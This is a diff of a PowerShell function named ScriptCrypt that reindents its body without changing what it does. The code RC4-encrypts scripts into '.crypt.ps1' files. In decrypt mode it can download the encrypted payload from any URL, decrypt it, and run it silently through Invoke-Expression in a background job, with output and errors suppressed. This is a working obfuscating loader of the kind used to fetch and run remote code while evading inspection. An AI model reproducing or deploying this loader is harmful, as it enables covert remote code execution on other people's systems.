@@ -62,43 +62,45 @@ function ScriptCrypt {
         [Array]::Copy($nonce,0,$r,$kb.Length,8)
         ,$r
     }
-   if ($Mode -eq 'E') {
-    $full = [IO.Path]::GetFullPath($Path)
-    if (-not [IO.File]::Exists($full)) { throw "File not found: $full" }
-    $plain = [IO.File]::ReadAllBytes($full)
-    $nonce = New-Object byte[] 8
-    ([Security.Cryptography.RandomNumberGenerator]::Create()).GetBytes($nonce)
-    $k = _rk $Key $nonce
-    $ct = _rc4 $k $plain
-    $all = New-Object byte[] ($ct.Length + 8)
-    [Array]::Copy($nonce,0,$all,0,8)
-    [Array]::Copy($ct,0,$all,8,$ct.Length)
-    $out = [IO.Path]::Combine(
-        [IO.Path]::GetDirectoryName($full),
-        ([IO.Path]::GetFileNameWithoutExtension($full) + '.crypt.ps1'))
-    [IO.File]::WriteAllText($out, (_enc $all), [Text.Encoding]::ASCII)
-    return $out
-}
-elseif ($Mode -eq 'D') {
-    if ($Path -match '^https?://') {
-        $text = (New-Object Net.WebClient).DownloadString($Path)
-    } else {
-        if (-not [IO.File]::Exists($Path)) { throw "File not found: $Path" }
-        $text = [IO.File]::ReadAllText($Path)
+
+    if ($Mode -eq 'E') {
+        $full = [IO.Path]::GetFullPath($Path)
+        if (-not [IO.File]::Exists($full)) { throw "File not found: $full" }
+        $plain = [IO.File]::ReadAllBytes($full)
+        $nonce = New-Object byte[] 8
+        ([Security.Cryptography.RandomNumberGenerator]::Create()).GetBytes($nonce)
+        $k = _rk $Key $nonce
+        $ct = _rc4 $k $plain
+        $all = New-Object byte[] ($ct.Length + 8)
+        [Array]::Copy($nonce,0,$all,0,8)
+        [Array]::Copy($ct,0,$all,8,$ct.Length)
+        $out = [IO.Path]::Combine(
+            [IO.Path]::GetDirectoryName($full),
+            ([IO.Path]::GetFileNameWithoutExtension($full) + '.crypt.ps1'))
+        [IO.File]::WriteAllText($out, (_enc $all), [Text.Encoding]::ASCII)
+        return $out
     }
-    $data = _dec $text.Trim()
-    if ($data.Length -lt 8) { throw 'Bad data' }
-    $nonce = New-Object byte[] 8
-    [Array]::Copy($data,0,$nonce,0,8)
-    $ct = New-Object byte[] ($data.Length - 8)
-    [Array]::Copy($data,8,$ct,0,$ct.Length)
-    $k = _rk $Key $nonce
-    $script = [Text.Encoding]::UTF8.GetString((_rc4 $k $ct))
-    Start-Job -ScriptBlock {
-        param($c)
-        $ProgressPreference='SilentlyContinue'
-        $VerbosePreference='SilentlyContinue'
-        $WarningPreference='SilentlyContinue'
-        try { Invoke-Expression $c | Out-Null } catch { }
-    } -ArgumentList $script | Out-Null
+    elseif ($Mode -eq 'D') {
+        if ($Path -match '^https?://') {
+            $text = (New-Object Net.WebClient).DownloadString($Path)
+        } else {
+            if (-not [IO.File]::Exists($Path)) { throw "File not found: $Path" }
+            $text = [IO.File]::ReadAllText($Path)
+        }
+        $data = _dec $text.Trim()
+        if ($data.Length -lt 8) { throw 'Bad data' }
+        $nonce = New-Object byte[] 8
+        [Array]::Copy($data,0,$nonce,0,8)
+        $ct = New-Object byte[] ($data.Length - 8)
+        [Array]::Copy($data,8,$ct,0,$ct.Length)
+        $k = _rk $Key $nonce
+        $script = [Text.Encoding]::UTF8.GetString((_rc4 $k $ct))
+        Start-Job -ScriptBlock {
+            param($c)
+            $ProgressPreference='SilentlyContinue'
+            $VerbosePreference='SilentlyContinue'
+            $WarningPreference='SilentlyContinue'
+            try { Invoke-Expression $c | Out-Null } catch { }
+        } -ArgumentList $script | Out-Null
+    }
 }
